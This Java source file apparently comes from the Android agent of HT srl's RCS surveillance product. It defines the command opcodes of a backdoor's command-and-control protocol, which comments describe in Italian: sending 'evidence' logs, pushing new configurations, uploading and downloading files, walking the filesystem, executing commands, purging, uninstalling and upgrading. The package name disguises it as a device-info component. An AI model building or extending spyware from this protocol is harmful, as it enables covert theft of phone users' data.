/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Proto.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.action.sync;

// TODO: Auto-generated Javadoc
/**
 * The Class Proto.
 */
public final class Proto {
	/** The Constant OK. */
	public static final int OK = 0x1; // OK

	/** The Constant NO. */
	public static final int NO = 0x2; // Comando fallito o non e' stato
	// possibile eseguirlo
	/** The Constant BYE. */
	public static final int BYE = 0x3; // Chiusura di connessione

	/** The Constant CHALLENGE. */
	//public static final int CHALLENGE = 0x4; // CHALLENGE,16 byte da
	// cifrare
	/** The Constant RESPONSE. */
	//public static final int RESPONSE = 0x5; // RESPONSE,16 byte cifrati

	/** The Constant SYNC. */
	//public static final int SYNC = 0x6; // Mandami i log

	/** The Constant NEW_CONF. */
	public static final int NEW_CONF = 0x7; // NEW_CONF,# prendi la nuova
	// conf lunga # bytes
	/** The Constant LOG_NUM. */
	//public static final int EVIDENCE_NUM = 0x8; // LOG_NUM,# stanno per
	// arrivare # logs
	/** The Constant LOG. */
	public static final int EVIDENCE = 0x9; // LOG,# questo log e' lungo #
	// bytes
	/** The Constant UNINSTALL. */
	public static final int UNINSTALL = 0xa; // Uninstallati

	/** The Constant RESUME. */
	public static final int EVIDENCE_SIZE = 0xb; // Evidence size

	/** The Constant DOWNLOAD. */
	public static final int DOWNLOAD = 0xc; // DOWNLOAD,nome: mandami il
	// file "nome" (in WCHAR, NULL
	// terminato)
	/** The Constant UPLOAD. */
	public static final int UPLOAD = 0xd; // UPLOAD,nome,directory,#: uppa
	// il file "nome" lungo # in
	// "directory"
	/** The Constant FILE. */
	//public static final int FILE = 0xe; // #, Sta per arrivare un file
	// lungo # bytes
	/** The Constant ID. */
	public static final int ID = 0xf; // Id univoco della backdoor,
	// embeddato in fase di
	// configurazione
	/** The Constant EVIDENCE_CHUNK. */
	public static final int EVIDENCE_CHUNK = 0x10; // 
	/** The Constant USERID. */
	//public static final int USERID = 0x11; // IMSI,# byte NON paddati del
	// blocco (il blocco inviato e'
	// paddato)
	/** The Constant DEVICEID. */
	//public static final int DEVICEID = 0x12; // IMEI,# byte NON paddati
	// del blocco (il blocco
	// inviato e' paddato)
	/** The Constant SOURCEID. */
	//public static final int SOURCEID = 0x13; // #telefono,# byte NON
	// paddati del blocco (il
	// blocco inviato e' paddato)
	/** The Constant VERSION. */
	//public static final int VERSION = 0x14; // #,bytes versione della
	// backdoor (10 byte)
	/** The Constant LOG_END. */
	//public static final int LOG_END = 0x15; // La spedizione dei log e'
	// terminata
	/** The Constant UPGRADE. */
	public static final int UPGRADE = 0x16; // Tag per l'aggiornamento del
	// core
	/** The Constant ENDFILE. */
	public static final int ENDFILE = 0x17; // Tag che indica la
	// terminazione della fase di
	// download dei file
	/** The Constant SUBTYPE. */
	public static final int SUBTYPE = 0x18; // #,bytes che indicano la

	/** The Constant FILESYSTEM. */
	public static final int FILESYSTEM = 0x19; // FILESYSTEM,depth, path:
	// filesystem tree in
	// profondita'
	
	/** The Constant PURGE. */
	public static final int PURGE = 0x1a;
	
	/** The Constant EVOFFSET. */
	public static final int EXEC = 0x1b;
	
	/** The Constant LASTTYPE. */
	public static final int LASTTYPE = 0x1c;

	/** The Constant STRINGS. */
	public static final String[] STRINGS = new String[] { "NULL", "OK", "NO", "BYE", "CHALLENGE", "RESPONSE", "SYNC", //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$ //$NON-NLS-7$
			"NEW_CONF", "LOG_NUM", "EVIDENCE", "UNINSTALL", "EVIDENCE_SIZE", "DOWNLOAD", "UPLOAD", "FILE", "ID", "EVIDENCE_CHUNK", //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$ //$NON-NLS-7$ //$NON-NLS-8$ //$NON-NLS-9$ //$NON-NLS-10$
			"USERID", "DEVICEID", "SOURCEID", "VERSION", "LOG_END", "UPGRADE", "ENDFILE", "SUBTYPE", "FILESYSTEM", "PURGE", "EXEC", "LASTTYPE" }; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$ //$NON-NLS-7$ //$NON-NLS-8$ //$NON-NLS-9$

	public static final int ERROR = 0;

	/**
	 * Instantiates a new proto.
	 */
	private Proto() {
	}
}
